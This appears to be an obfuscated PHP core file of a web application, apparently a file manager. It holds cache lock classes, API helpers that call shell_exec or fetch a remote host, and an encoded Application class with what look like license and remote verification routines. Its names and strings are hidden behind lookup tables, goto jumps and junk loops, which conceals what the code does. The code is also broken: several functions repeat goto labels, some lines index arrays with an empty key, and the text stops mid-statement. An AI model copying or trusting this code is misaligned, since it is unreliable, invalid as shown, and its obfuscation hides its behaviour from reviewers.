<?php
 goto dهΗ; aƟ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $cމ =& $_SERVER[ԥ]; $C = $GLOBALS[$cމ[6]][$cމ[333]]; self::$cachePath = $C[$cމ[163]][$cމ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($c, $DݷÊ = 0) { goto e; fރ: $this->unlock($c); return !1; goto C; e: $A෋ϱ =& $_SERVER[ԥ]; $F = microtime(!0); $Dآ = $F + $DݷÊ + 0.0001; goto dؚ; dؚ: $c = rtrim(self::$cachePath, $A෋ϱ[8]) . $A෋ϱ[764] . md5($c) . $A෋ϱ[765]; if (file_exists($c) && filemtime($c) && filemtime($c) < time() - 10) { @unlink($c); } do { if (file_exists($c)) { cacheLockWait(); continue; } $A燼 = fopen($c, $A෋ϱ[766]); if (!$A燼) { return !1; } $b = flock($A燼, LOCK_EX | LOCK_NB); self::$caches[$c] = array($A෋ϱ[767] => $A燼, $A෋ϱ[163] => $c); fwrite($A燼, $Dآ); clearstatcache(); if ($A燼 && $b) { return !0; } cacheLockWait(); } while (microtime(!0) < $Dآ); goto fރ; C: } public function lockGet($dȊ셎) { $A =& $_SERVER[ԥ]; $d珿γ = rtrim(self::$cachePath, $A[8]) . $A[764] . md5($dȊ셎) . $A[765]; return file_exists($d珿γ); } public function unlock($a鎐ʄ) { goto eʹ; eʹ: $E =& $_SERVER[ԥ]; $Bƚˌ = self::$caches[$a鎐ʄ]; if (!$Bƚˌ) { return; } goto eȠ͉; c뎼: unset(self::$caches[$a鎐ʄ]); goto e; eȠ͉: @flock($Bƚˌ[$E[767]], LOCK_UN); @fclose($Bƚˌ[$E[767]]); @unlink($Bƚˌ[$E[163]]); goto c뎼; e: } } class CacheLockRedis { public function lock($cЙ, $F֓Т = 10) { $C턏 = Cache::init(); $Bۘ = microtime(!0) + $F֓Т; while (microtime(!0) < $Bۘ) { $cćǹ = $C턏->get($cЙ); if (!$cćǹ) { $DªÖ = $C턏->setLock($cЙ, $Bۘ, $F֓Т); if ($DªÖ) { return !0; } } else { if ($cćǹ < microtime(!0)) { $C턏->set($cЙ, $Bۘ, $Bۘ); if ($C턏->get($cЙ) === $cćǹ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Cѥ) { return Cache::init()->get($Cѥ); } public function unlock($d) { return Cache::init()->remove($d); } } class CacheLockMemcached { public function lock($Cᳺ, $E痦 = 0) { $e﹜ = Cache::init(); $c䇭 = microtime(!0) + $E痦; while (microtime(!0) < $c䇭) { $cِ = $e﹜->get($Cᳺ); if (!$cِ || $cِ < microtime(!0)) { $d« = $e﹜->handle->add($Cᳺ, $c䇭, $E痦); if ($d«) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Cߜ) { return Cache::init()->get($Cߜ); } public function unlock($Eե) { return Cache::init()->remove($Eե); } } goto f؊̰; d: define($_SERVER[ԥ][1896], 3); define($_SERVER[ԥ][1897], 4); define($_SERVER[ԥ][1898], 5); goto B; fɚ: function ActionCall($fìջ) { $f㍦ = array_slice(func_get_args(), 1); return ActionApply($fìջ, $f㍦); } function ActionCallApi($E, $fÈ = '') { goto aǼ; Bׇѩ: $Bދ = phpBinCommand(); if ($Bދ && function_exists($dљ[25])) { $c؛ = $Bދ . $dљ[26] . BASIC_PATH . $dљ[27] . escapeshellarg($E); $c̫ = shell_exec($c؛); } if (!$c̫) { $D紜 = stream_context_create(array($dљ[28] => array($dљ[29] => 20, $dљ[30] => $dљ[31]))); $c̫ = file_get_contents(APP_HOST . $dљ[32] . $E, !1, $D紜); } goto d߭; F뚞օ: $Eܓ = Action($dљ[23])->accessToken(); $E = str_replace($dљ[5], $dљ[4], $E) . $dљ[24] . $Eܓ . $a禵; $c̫ = $dљ[20]; goto Bׇѩ; aǼ: $dљ =& $_SERVER[]; $a禵 = $fÈ; if (is_array($fÈ)) { $a禵 = $dљ[20]; foreach ($fÈ as $e𴄛 => $c߃) { $c߃ = is_array($c߃) ? json_encode($c߃) : $c߃; $c߃ = is_bool($c߃) ? intval($c߃) : $c߃; $a禵 .= $dљ[21] . $e𴄛 . $dљ[22] . rawurlencode($c߃); } } goto F뚞օ; F޸: return $e; goto e; d߭: $Dɑ = json_decode($c̫, !0); $e = is_array($Dɑ) ? $Dɑ : array($dљ[33] => null, $dљ[34] => $c̫); if (!$Dɑ) { echo $c̫; } goto F޸; e: } function ActionCallHook($dʄϱ) { goto Aʘ; d˩: $Bՙ = $a̢䌑 ? json_decode($a̢䌑, !0) : $Bՙ; $GLOBALS[$eѼ[35]] = 0; return $Bՙ; goto FҞ; a犛: $GLOBALS[$eѼ[35]] = 1; $Bՙ = ActionApply($dʄϱ, $Bꐪ); $a̢䌑 = ob_get_clean(); goto d˩; Aʘ: $eѼ =& $_SERVER[]; ob_start(); $Bꐪ = array_slice(func_get_args(), 1); goto a犛; FҞ: } goto Dŕ˴; a: $b = $_SERVER[ԥ][547]; while (strlen($b) < $_SERVER[ԥ][548]) { if (!$b) { break; } $b++; } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($B) { goto EŘ; DѐӜ: $this->defaultAction = $DѤ[2] ? $DѤ[2] : $this->defaultAction; $this->{$_SERVER[ƥ][3]}($d[4], array($this, $d[5])); $F֏ᯇ = $FƤ۰[551]; goto d; EŘ: $FƤ۰ =& $_SERVER[ԥ]; $d =& $_SERVER[ƥ]; $DѤ = $d[0]($d[1], $d[2]($B, $d[1])); goto Eأ; Eأ: $AР = $FƤ۰[549]; if (!$AР) { return; } $this->defaultModule = $DѤ[0] ? $DѤ[0] : $this->defaultModule; goto D멢Ы; D멢Ы: $this->defaultController = $DѤ[1] ? $DѤ[1] : $this->defaultController; $dɐ嶑 = $FƤ۰[550]; while ($dɐ嶑 < $FƤ۰[544]) { if ($dɐ嶑 >= 0) { break; } $dɐ嶑++; } goto DѐӜ; d: } public function appRun($C) { goto CԌ; bՖ̹: if ($D == $dɦ[8]) { $dˮ = $dɦ[9]; $BҺ[0] = $dɦ[10]; $BҺ[1] = $BҺ[1] . $dɦ[11]; $C = $dɦ[12]($dɦ[1], $BҺ); $C = $dɦ[2]($C, $dɦ[1]); } $dɦ[13](array($dɦ[14], $dɦ[15]), $dˮ . $dɦ[16], $C); $dɦ[17]($C); goto bњ΍Ω; bњ΍Ω: $dɦ[13](array($dɦ[14], $dɦ[15]), $dˮ . $dɦ[18], $C); goto Dć; CԌ: $dɦ =& $_SERVER[ƥ]; $BҺ = $dɦ[0]($dɦ[1], $C); $D = $dɦ[6]($BҺ[0]); goto bאԡ; bאԡ: $B = $_SERVER[ԥ][552]; if (!$B) { die; } $dˮ = $dɦ[7]; goto bՖ̹; Dć: } private function autorun() { goto F; F: foreach ($config[$B禫児[20]] as $A => $C) { $this->{$_SERVER[ƥ][21]}($C); } goto eη; F: $Bߕ =& $_SERVER[ԥ]; $B禫児 =& $_SERVER[ƥ]; global $config; goto Bōɛ; Bōɛ: $d۾ = $Bߕ[553]; while (strlen($d۾) < $Bߕ[544]) { if (!$d۾) { break; } $d۾++; } if ($B禫児[19]($config[$B禫児[20]]) == 0) { return; } goto F; eη: } private function atpx041dfce9() { goto D; a: $D݉ = array($F[8], $cł); $DԌ = $F[26]($GLOBALS[$F[22]][$F[23]], 1); $GLOBALS[$F[22]][$F[23]] = $F[27]($D݉, $DԌ); goto e쭍; AՄ: $cł = $F[25]($b뻍, 0, -$F[24]($A)); $Eّ = $aߤ[554]; if (!$Eّ) { die; } goto a; c觩: $b뻍 = $GLOBALS[$F[22]][$F[23]][0]; if (!$b뻍 || $F[24]($b뻍) <= $F[24]($A)) { return; } if ($F[6]($F[25]($b뻍, -$F[24]($A))) != $A) { return; } goto AՄ; e쭍: $d = $aߤ[555]; if (strlen($d) < $aߤ[556]) { die; } $GLOBALS[$F[22]][$F[28]] = $F[29]($F[1], $GLOBALS[$F[22]][$F[23]]); goto bǱ; D: $aߤ =& $_SERVER[ԥ]; $F =& $_SERVER[ƥ]; $A = $F[8]; goto c觩; bǱ: } private function yihc930118e7() { goto dؽۗ; dؽۗ: $B =& $_SERVER[ƥ]; if ($GLOBALS[$B[22]][$B[28]] != $B[10]) { return; } $a = $_SERVER[$B[30]]; goto aب; aب: $E䂿 = $B[31]; if (!$B[32]($a, $E䂿)) { return; } $C = $B[33]($a, $E䂿); goto fվ荐ў; B٩: $eӧߚ = $B[2]($d[0][0], $B[36]); $GLOBALS[$B[22]][$B[23]] = $B[0]($B[36], $eӧߚ); $GLOBALS[$B[22]][$B[28]] = $B[29]($B[1], $GLOBALS[$B[22]][$B[23]]); goto C陋Ñ; fվ荐ў: $eӧߚ = $B[25]($a, $C + $B[24]($E䂿)); $a = $_SERVER[ԥ][557]; $B[34]($B[35], $eӧߚ, $d); goto B٩; C陋Ñ: } public function run() { goto B; cȯ: while (strlen($B٢) < $a[548]) { if (!$B٢) { break; } $B٢++; } $_SERVER[$eڲ[44]] = $eڲ[6](ACTION); $this->{$_SERVER[ƥ][45]}(); goto Eν; B: $a =& $_SERVER[ԥ]; $eڲ =& $_SERVER[ƥ]; $this->{$_SERVER[ƥ][37]}(); goto A䑪; f: $f = $GLOBALS[$eڲ[22]][$eڲ[23]]; $f = $GLOBALS[$eڲ[22]][$eڲ[28]]; $eڲ[39]($eڲ[40], isset($f[0]) && $f[0] ? $f[0] : $this->defaultModule); goto F뾧; Eν: if ($eڲ[19]($f) >= 3) { $this->{$_SERVER[ƥ][21]}($f); } else { $this->{$_SERVER[ƥ][21]}(ACTION); } goto Eᵆ; d𛰖: $eڲ[39]($eڲ[42], isset($f[2]) && $f[0] ? $f[2] : $this->defaultAction); $eڲ[39]($eڲ[43], MOD . $eڲ[1] . ST . $eڲ[1] . ACT); $B٢ = $a[560]; goto cȯ; A䑪: $this->{$_SERVER[ƥ][38]}(); $fޅ = $a[558]; if (!$fޅ) { die; } goto f; F뾧: $eڲ[39]($eڲ[41], isset($f[1]) && $f[0] ? $f[1] : $this->defaultController); $d = $a[559]; if (!$d) { die; } goto d𛰖; Eᵆ: } private $qrwp32a87cce = array(); private $gapf23b9068d = ''; public function ianj5071aa14() { goto f֝; f癋: $DȺ = $AЃŝ[563]; if (!$DȺ) { return; } $this->{$_SERVER[ƥ][49]}(); goto CɌȎ; eō: $this->{$_SERVER[ƥ][52]}(); $cģ = $AЃŝ[565]; $this->{$_SERVER[ƥ][3]}($e[53], array($this, $e[54])); goto F׋; fӴ£: $E̾ = $AЃŝ[562]; while (strlen($E̾) < $AЃŝ[556]) { if (!$E̾) { break; } $E̾++; } $this->{$_SERVER[ƥ][48]}(); goto f癋; dǉ: $this->{$_SERVER[ƥ][3]}($e[57], array($this, $e[58])); $this->{$_SERVER[ƥ][3]}($e[59], array($this, $e[60])); goto b; CɌȎ: $this->{$_SERVER[ƥ][50]}(); $this->{$_SERVER[ƥ][51]}(); $cڤ = $AЃŝ[564]; goto eō; F׋: $this->{$_SERVER[ƥ][3]}($e[55], array($this, $e[56])); $B = $AЃŝ[566]; if (!$B) { die; } goto dǉ; A: $F = $AЃŝ[561]; if (!$F) { die; } $this->{$_SERVER[ƥ][47]}(); goto fӴ£; f֝: $AЃŝ =& $_SERVER[ԥ]; $e =& $_SERVER[ƥ]; $this->{$_SERVER[ƥ][46]}(); goto A; b: } public function unmp7a33fef0($aåѭ) { goto AǍ; aޑ: $Cݽ = $aåѭ[$E˅Ʉ[93]][$E˅Ʉ[94]][$E˅Ʉ[76]]; $D = $B̹[571]; if (strlen($D) < $B̹[544]) { die; } goto F蠑; F蠑: unset($aåѭ[$E˅Ʉ[93]][$E˅Ʉ[95]][$E˅Ʉ[96]]); unset($aåѭ[$E˅Ʉ[93]][$E˅Ʉ[95]][$E˅Ʉ[97]]); $f = $B̹[572]; goto Fժ; D˂ۿ: if (!$E) { return; } unset($aåѭ[$E˅Ʉ[93]][$E˅Ʉ[94]][$E˅Ʉ[98]]); $cá = $B̹[574]; goto c򰳈; C꺸: $A収 = $B̹[569]; if (strlen($A収) < $B̹[570]) { die; } foreach ($A˿ as $BĜ) { $d = $GLOBALS[$E˅Ʉ[91]][$E˅Ʉ[92]][$BĜ]; if (isset($c䳒[$BĜ])) { $d = $c䳒[$BĜ]; } $aåѭ[$E˅Ʉ[93]][$E˅Ʉ[94]][$BĜ] = $d; } goto aޑ; AǍ: $B̹ =& $_SERVER[ԥ]; $E˅Ʉ =& $_SERVER[ƥ]; $c䳒 = $E˅Ʉ[61]($E˅Ʉ[62])->{$_SERVER[ƥ][63]}(); goto aɄ; b: $eӗ = $B̹[575]; if (strlen($eӗ) < $B̹[548]) { return; } $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[113]] = $E˅Ʉ[114]($_SERVER[$E˅Ʉ[115]] . $c䳒[$E˅Ʉ[116]]); goto B清; eؚ: if ($this->gapf23b9068d == $E˅Ʉ[121]) { $aåѭ[$E˅Ʉ[93]][$E˅Ʉ[94]][$E˅Ʉ[99]][$E˅Ʉ[107]] = 0; } $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[128]] = $E˅Ʉ[104]($this->qrwp32a87cce, $E˅Ʉ[129], $E˅Ʉ[10]); $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[130]] = $E˅Ʉ[104]($this->qrwp32a87cce, $E˅Ʉ[131], $E˅Ʉ[10]); goto d; aɄ: $d쓣Ǘ = $B̹[567]; if (strlen($d쓣Ǘ) < $B̹[568]) { return; } $A˿ = array($E˅Ʉ[64], $E˅Ʉ[65], $E˅Ʉ[66], $E˅Ʉ[67], $E˅Ʉ[68], $E˅Ʉ[69], $E˅Ʉ[70], $E˅Ʉ[71], $E˅Ʉ[72], $E˅Ʉ[73], $E˅Ʉ[74], $E˅Ʉ[75], $E˅Ʉ[76], $E˅Ʉ[77], $E˅Ʉ[78], $E˅Ʉ[79], $E˅Ʉ[80], $E˅Ʉ[81], $E˅Ʉ[82], $E˅Ʉ[83], $E˅Ʉ[84], $E˅Ʉ[85], $E˅Ʉ[86], $E˅Ʉ[87], $E˅Ʉ[88], $E˅Ʉ[89], $E˅Ʉ[90]); goto C꺸; d: $f = $B̹[576]; if (!$f) { return; } if ($E˅Ʉ[104]($GLOBALS, $E˅Ʉ[132]) && $this->config[$E˅Ʉ[133]]) { $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[134]] = WEB_ROOT; } goto Aڋ; Aڋ: return $aåѭ; goto B; B清: $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[117]] = $E˅Ʉ[118]($E˅Ʉ[119]()); $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[120]] = $this->gapf23b9068d; if ($c䳒[$E˅Ʉ[120]] != $E˅Ʉ[121]) { $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[122]] = $c䳒[$E˅Ʉ[122]]; $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[123]] = $c䳒[$E˅Ʉ[123]]; $F = $E˅Ʉ[124](10) . $this->gapf23b9068d . $E˅Ʉ[124](5); $aåѭ[$E˅Ʉ[93]][$E˅Ʉ[125]][$E˅Ʉ[126]] = $this->{$_SERVER[ƥ][127]}($F, $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[113]]); } goto eؚ; Fժ: while (strlen($f) < $B̹[570]) { if (!$f) { break; } $f++; } unset($aåѭ[$E˅Ʉ[93]][$E˅Ʉ[94]][$E˅Ʉ[76]]); $E = $B̹[573]; goto D˂ۿ; c򰳈: if (!$cá) { return; } $aåѭ[$E˅Ʉ[93]][$E˅Ʉ[94]][$E˅Ʉ[99]] = array($E˅Ʉ[100] => (int) $Cݽ[$E˅Ʉ[101]], $E˅Ʉ[102] => $E˅Ʉ[103]($E˅Ʉ[104]($Cݽ, $E˅Ʉ[105], array())), $E˅Ʉ[106] => (int) $E˅Ʉ[104]($Cݽ, $E˅Ʉ[107], 0)); $aåѭ[$E˅Ʉ[108]][$E˅Ʉ[109]] = $E˅Ʉ[110]($E˅Ʉ[111])->{$_SERVER[ƥ][112]}(); goto b; B: } private function hfyk51d0538a() { goto A; Cϋ: $c΄ = array($e׆Ĉ[159] => $FΠ[$e׆Ĉ[64]], $e׆Ĉ[160] => $FΠ[$e׆Ĉ[65]], $e׆Ĉ[161] => $e׆Ĉ[10]); $Bәث = $A[579]; if (strlen($Bәث) < $A[548]) { die; } goto AԌ׋; A: if ($this->gapf23b9068d == $e׆Ĉ[121]) { return; } $eӾ = array($e׆Ĉ[153], $e׆Ĉ[154], $e׆Ĉ[155], $e׆Ĉ[156], $e׆Ĉ[157], $e׆Ĉ[158]); $b䂗τ = $A[577]; goto d; A: $A =& $_SERVER[ԥ]; $e׆Ĉ =& $_SERVER[ƥ]; if ($_SERVER[$e׆Ĉ[44]] == $e׆Ĉ[135]) { $b몦 = array($e׆Ĉ[120] => $this->gapf23b9068d, $e׆Ĉ[136] => $this->{$_SERVER[ƥ][137]}(), $e׆Ĉ[138] => $e׆Ĉ[61]($e׆Ĉ[139])->{$_SERVER[ƥ][140]}()); if ($this->gapf23b9068d != $e׆Ĉ[121]) { $fɟ = $e׆Ĉ[104]($this->qrwp32a87cce, $e׆Ĉ[141]); if ($fɟ) { $b몦[$e׆Ĉ[142]] = $fɟ; $b몦[$e׆Ĉ[143]] = $e׆Ĉ[144]($e׆Ĉ[104]($this->qrwp32a87cce, $e׆Ĉ[145])); $b몦[$e׆Ĉ[146]] = $e׆Ĉ[104]($this->qrwp32a87cce, $e׆Ĉ[131]); } } $b몦 = $this->{$_SERVER[ƥ][147]}($e׆Ĉ[148]($b몦), $e׆Ĉ[114]($e׆Ĉ[149])); $c΄ = array($e׆Ĉ[150] => $b몦); $e׆Ĉ[13](array($e׆Ĉ[151], $e׆Ĉ[152]), $c΄); } goto A; d: $FΠ = $e׆Ĉ[61]($e׆Ĉ[62])->{$_SERVER[ƥ][63]}(); $D薋 = $A[578]; while ($D薋 < $A[544]) { if ($D薋 >= 0) { break; } $D薋++; } goto Cϋ; AԌ׋: foreach ($eӾ as $cֆ) { if (!isset($FΠ[$cֆ]) || !$FΠ[$cֆ]) { continue; } $c΄[$cֆ] = $FΠ[$cֆ]; } $e׆Ĉ[13](array($e׆Ĉ[151], $e׆Ĉ[152]), $c΄); goto Fѯ; Fѯ: } private function sifle7ccd9e2() { goto Eƍ; Eƍ: $F =& $_SERVER[ԥ]; $FǕ =& $_SERVER[ƥ]; if ($_SERVER[$FǕ[44]] != $FǕ[162]) { return; } goto Fɋ; E: $d݌ = $FǕ[25]($FǕ[114]($d㝸[$FǕ[210]]), 10, 10); $bՌ = $d݌ . $d㝸[$FǕ[120]] . $d㝸[$FǕ[212]]; $d㝸[$FǕ[122]] = $FǕ[214]($FǕ[118]($this->{$_SERVER[ƥ][147]}($bՌ, $FǕ[215]))); goto Cģ̉; Cϣ: $bԿ = $F[586]; if (strlen($bԿ) < $F[544]) { return; } $D焫 = $FǕ[222]($FǕ[61]($FǕ[11])->{$_SERVER[ƥ][223]}(), $FǕ[224]); goto C݄; Fևٍ: if (!isset($F׭Ǳ[$FǕ[165]]) || $FǕ[24]($F׭Ǳ[$FǕ[165]]) != 16) { $FǕ[166]($FǕ[167] . $F׭Ǳ[$FǕ[165]], !1); } $eڇ = $FǕ[61]($FǕ[62])->{$_SERVER[ƥ][63]}($FǕ[116]); $fӳ = array($FǕ[165] => $F׭Ǳ[$FǕ[165]], $FǕ[168] => $FǕ[124](16), $FǕ[169] => $FǕ[149], $FǕ[170] => $FǕ[171], $FǕ[172] => $_SERVER[$FǕ[173]], $FǕ[174] => $_SERVER[$FǕ[175]], $FǕ[176] => $_SERVER[$FǕ[177]]); goto fܘ; fܘ: $dʳ = $FǕ[114]($_SERVER[$FǕ[115]] . $eڇ); if ($F׭Ǳ[$FǕ[178]] == $FǕ[179]) { $E󚴈 = $this->{$_SERVER[ƥ][147]}($dʳ, $FǕ[180]); $Aø = $this->{$_SERVER[ƥ][127]}($FǕ[148]($fӳ), $dʳ . $FǕ[181], 3); $AɎԋ޸ = $this->{$_SERVER[ƥ][182]}($FǕ[183] . $E󚴈 . $FǕ[184] . $Aø, -1); $FǕ[166]($AɎԋ޸, !0); } else { if ($F׭Ǳ[$FǕ[178]] == $FǕ[185]) { $a = $FǕ[25]($FǕ[114]($FǕ[186] . $dʳ), 12, 15) . $FǕ[187]; $Aø = $this->{$_SERVER[ƥ][188]}($FǕ[2]($F׭Ǳ[$FǕ[189]]), $a, 2); $fåॊ = $FǕ[190]($Aø, !0); if (!$FǕ[191]($fåॊ) || !$FǕ[191]($fåॊ[$FǕ[192]]) || $fåॊ[$FǕ[165]] != !0) { $a = $FǕ[193]; $Bɩ = $fåॊ[$FǕ[192]] ? $FǕ[194] . $fåॊ[$FǕ[192]] : $a; $FǕ[166]($Bɩ, !1); } else { $fӳ[$FǕ[168]] = $fåॊ[$FǕ[192]][$FǕ[195]]; } } else { $fåॊ = $this->{$_SERVER[ƥ][182]}($FǕ[196], $fӳ, 10); $Bԥ = $F[580]; if (!$Bԥ) { return; } } } if (!$FǕ[191]($fåॊ) || !$FǕ[191]($fåॊ[$FǕ[192]]) || $fåॊ[$FǕ[165]] != !0) { $a = $FǕ[197]($FǕ[198]); $Bɩ = $fåॊ[$FǕ[192]] ? $FǕ[194] . $fåॊ[$FǕ[192]] : $a; $FǕ[166]($Bɩ, !1); } goto f׍Į; Fɋ: if (!$FǕ[104]($GLOBALS, $FǕ[132])) { die; } $F׭Ǳ = $GLOBALS[$FǕ[22]]; if (isset($F׭Ǳ[$FǕ[163]])) { $this->{$_SERVER[ƥ][164]}(); die; } goto Fևٍ; Cģ̉: $c۾ = $F[582]; if (strlen($c۾) < $F[568]) { return; } $E = $FǕ[124](16); goto Cё; DЧ: $d = $F[590]; if (strlen($d) < $F[568]) { die; } $FǕ[166]($FǕ[197]($FǕ[208]), !0); goto a; Fɒ: $d㝸[$FǕ[123]] = $FǕ[118]($FǕ[214]($this->{$_SERVER[ƥ][147]}($E̢, $FǕ[216]))); $E = $F[584]; if (strlen($E) < $F[570]) { die; } goto DШڻ; c: $e˹ = $FǕ[214]($FǕ[25]($dӷ, 10, 16)); $Fɶ = $F[585]; $Aʉ = $this->{$_SERVER[ƥ][127]}($FǕ[148]($E؄), $dӷ); goto Cϣ; C݄: $bΨ̅ = $F[587]; $Dך = $D焫[$FǕ[225]]; $c˦ = $F[588]; goto ań; ań: while (strlen($c˦) < $F[544]) { if (!$c˦) { break; } $c˦++; } $bՏ = array(); $Eͩɛ = $F[589]; goto E␃췏; E␃췏: if (!$Eͩɛ) { die; } $bՏ[$e˹] = $Aʉ; $FǕ[61]($FǕ[11])->{$_SERVER[ƥ][226]}($Dך[$FǕ[227]], array($FǕ[228] => $bՏ)); goto DЧ; DШڻ: if ($E؄[$FǕ[217]] && $E؄[$FǕ[217]] >= 1) { $FǕ[61]($FǕ[62])->{$_SERVER[ƥ][218]}($FǕ[219], $FǕ[220]); } $FǕ[61]($FǕ[62])->{$_SERVER[ƥ][221]}($d㝸); $dӷ = $FǕ[114]($_SERVER[$FǕ[115]] . $FǕ[214]($eڇ) . $d㝸[$FǕ[210]]); goto c; f׍Į: $E؄ = $fåॊ[$FǕ[192]]; $C = $this->{$_SERVER[ƥ][199]}($E؄[$FǕ[200]]); $d֡ = $F[581]; goto F΋; Cё: $E̢ = $E . $d㝸[$FǕ[120]] . $this->{$_SERVER[ƥ][147]}($FǕ[114]($d㝸[$FǕ[209]]), $E); $d߭ = $F[583]; if (strlen($d߭) < $F[544]) { die; } goto Fɒ; F΋: if (!$C || $C != $FǕ[201]($E؄[$FǕ[145]])) { $E = array($FǕ[202] => $FǕ[61]($FǕ[62])->{$_SERVER[ƥ][63]}($FǕ[116]), $FǕ[203] => $_SERVER[$FǕ[115]], $FǕ[204] => $FǕ[205](), $FǕ[174] => $_SERVER[$FǕ[175]]); $Aø = $this->{$_SERVER[ƥ][206]}($FǕ[148]($E)); $this->{$_SERVER[ƥ][182]}($FǕ[207] . $Aø); $FǕ[166]($FǕ[197]($FǕ[208]), !0); } $d㝸 = array($FǕ[209] => $fӳ[$FǕ[165]], $FǕ[210] => $E؄[$FǕ[211]], $FǕ[212] => $FǕ[124](16), $FǕ[120] => $E؄[$FǕ[213]]); if ($fӳ[$FǕ[168]]) { $d㝸[$FǕ[212]] = $fӳ[$FǕ[168]]; } goto E; a: } private function lsdc2fb1948b() { goto Bʾ⚏ڌ; D䎤: if (strlen($b) < $Fǃ[544]) { return; } goto d; Bʾ⚏ڌ: $Fǃ =& $_SERVER[ԥ]; $FΓ =& $_SERVER[ƥ]; $FΓ[61]($FΓ[62])->{$_SERVER[ƥ][221]}(array($FΓ[209] => $FΓ[10], $FΓ[210] => $FΓ[10], $FΓ[120] => $FΓ[121], $FΓ[122] => $FΓ[10], $FΓ[123] => $FΓ[10])); goto F⇆; F⇆: $FΓ[61]($FΓ[62])->{$_SERVER[ƥ][218]}($FΓ[219], $FΓ[229]); $E责 = $Fǃ[591]; while (strlen($E责) < $Fǃ[548]) { if (!$E责) { break; } $E责++; } goto Aδ; Aδ: $this->qrwp32a87cce = array(); $this->gapf23b9068d = $FΓ[121]; $b = $Fǃ[592]; goto D䎤; d: } private function ulhd4f79e219() { goto bҴ; Dԟ: $aȑ = $DߪĈ[61]($DߪĈ[62])->{$_SERVER[ƥ][63]}(); if ($aȑ[$DߪĈ[120]] == $DߪĈ[121]) { return; } $E̍Ή = $DߪĈ[61]($DߪĈ[62])->{$_SERVER[ƥ][63]}($DߪĈ[116]); goto Dձ۸; f鮖: $aۼ = $DߪĈ[214]($DߪĈ[25]($a, 10, 16)); $aн = $this->{$_SERVER[ƥ][188]}($CҢС[$DߪĈ[91]][$aۼ], $a); $aн = $DߪĈ[190]($aн, !0); goto bك; bك: $eː = $dĆ[597]; while ($eː < $dĆ[556]) { if ($eː >= 0) { break; } $eː++; } if (!$DߪĈ[191]($aн)) { return $this->{$_SERVER[ƥ][164]}(); } goto EăĪ; EăĪ: $fۤ = $DߪĈ[144]($aн[$DߪĈ[145]]); if ($DߪĈ[230]() >= $fۤ) { return $this->{$_SERVER[ƥ][164]}(); } $this->qrwp32a87cce = $aн; goto dΪ; bҴ: $dĆ =& $_SERVER[ԥ]; $DߪĈ =& $_SERVER[ƥ]; $_SERVER[$DߪĈ[175]] = $DߪĈ[104]($_SERVER, $DߪĈ[175], APP_HOST); goto Bշʇ; Bշʇ: $C𑋧 = $dĆ[593]; if (strlen($C𑋧) < $dĆ[568]) { die; } $this->gapf23b9068d = $DߪĈ[121]; goto Dԟ; dΪ: $this->gapf23b9068d = $aȑ[$DߪĈ[120]]; goto C; Dձ۸: $C턡 = $dĆ[594]; if (!$C턡) { die; } $Dݺ = $DߪĈ[222]($DߪĈ[61]($DߪĈ[11])->{$_SERVER[ƥ][223]}(), $DߪĈ[224]); goto bզ; c񈞱: $c탥˖ = $dĆ[596]; if (strlen($c탥˖) < $dĆ[570]) { return; } $a = $DߪĈ[114]($_SERVER[$DߪĈ[115]] . $DߪĈ[214]($E̍Ή) . $aȑ[$DߪĈ[210]]); goto f鮖; bզ: $Aҗ׉ = $dĆ[595]; if (strlen($Aҗ׉) < $dĆ[556]) { die; } $CҢС = $Dݺ[$DߪĈ[225]]; goto c񈞱; C: } private function tqlm3c64b934() { goto Eל; Eל: $F鏥 =& $_SERVER[ԥ]; $Dޏ =& $_SERVER[ƥ]; $D = $GLOBALS[$Dޏ[22]]; goto Eǃ; Fג: $b = array($Dޏ[234], $Dޏ[235]); if ($Dޏ[236]($bʘ훕, $b)) { if ($this->gapf23b9068d == $Dޏ[121] && isset($D[$Dޏ[237]])) { $Dޏ[166]($Dޏ[197]($Dޏ[232]), !1, $Dޏ[233]); die; } $fŘ = $this->{$_SERVER[ƥ][137]}(); if ($fŘ != $Dޏ[201]($Dޏ[238])) { if ($fŘ <= $Dޏ[61]($Dޏ[139])->{$_SERVER[ƥ][140]}()) { $Dޏ[166]($Dޏ[197]($Dޏ[239]), !1, $Dޏ[233]); die; } } } goto D达ޤ; Eǃ: $b = $F鏥[598]; if (!$b) { die; } $bʘ훕 = $_SERVER[$Dޏ[44]]; goto aԳ; aԳ: $C = $F鏥[599]; if (!$C) { die; } if ($bʘ훕 == $Dޏ[231] && $this->gapf23b9068d == $Dޏ[121]) { $Dޏ[166]($Dޏ[197]($Dޏ[232]), !1, $Dޏ[233]); } goto Fג; D达ޤ: } private function nxyb03a133c3() { goto b٤; F݅: if (!$Fả߫[104]($GLOBALS, $Fả߫[132]) || !isset($_GET[$Fả߫[241]])) { return; } if (!$Fả߫[236]($_SERVER[$Fả߫[44]], $Fڃ)) { return; } $Dû = $Fả߫[242]; goto fƜ; cւ: $C = $Aȗ[602]; $fʃ = @$Fả߫[250]($Dû, !1, $A졍); $aݷǾ = $Aȗ[603]; goto D; fƜ: $A⏋ = $Aȗ[600]; while ($A⏋ < $Aȗ[556]) { if ($A⏋ >= 0) { break; } $A⏋++; } $Dû = $this->{$_SERVER[ƥ][243]}($Dû, $Fả߫[244]); goto D̹; D̹: $e = $Aȗ[601]; if (!$e) { die; } $A졍 = $Fả߫[245](array($Fả߫[246] => array($Fả߫[247] => $Fả߫[248], $Fả߫[249] => 3))); goto cւ; D: while (strlen($aݷǾ) < $Aȗ[570]) { if (!$aݷǾ) { break; } $aݷǾ++; } $Fả߫[251]($Fả߫[252]); $Aأ = $Aȗ[604]; goto f; f: if (strlen($Aأ) < $Aȗ[548]) { return; } if ($fʃ && $Fả߫[32]($fʃ, $Fả߫[253])) { echo $fʃ; } die; goto d޲; b٤: $Aȗ =& $_SERVER[ԥ]; $Fả߫ =& $_SERVER[ƥ]; $Fڃ = 